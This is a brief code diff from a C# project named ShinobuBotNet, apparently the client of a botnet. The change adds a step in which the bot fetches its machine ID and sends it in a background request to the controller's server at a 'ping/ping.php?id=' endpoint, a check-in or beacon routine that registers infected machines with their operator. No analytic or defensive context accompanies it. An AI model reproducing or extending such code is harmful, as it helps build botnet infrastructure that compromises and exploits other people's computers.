@@ -54,7 +54,8 @@ namespace ShinobuBotNet
         {
             WebClient wc = new WebClient();
             wc.Proxy = null;
-            string PingURI = config.server + "ping.php";
+            string id = API.Get_ID();
+            string PingURI = config.server + "ping/ping.php?id=" + id;
             Thread thr = new Thread(() =>
            {
                wc.DownloadString(PingURI);
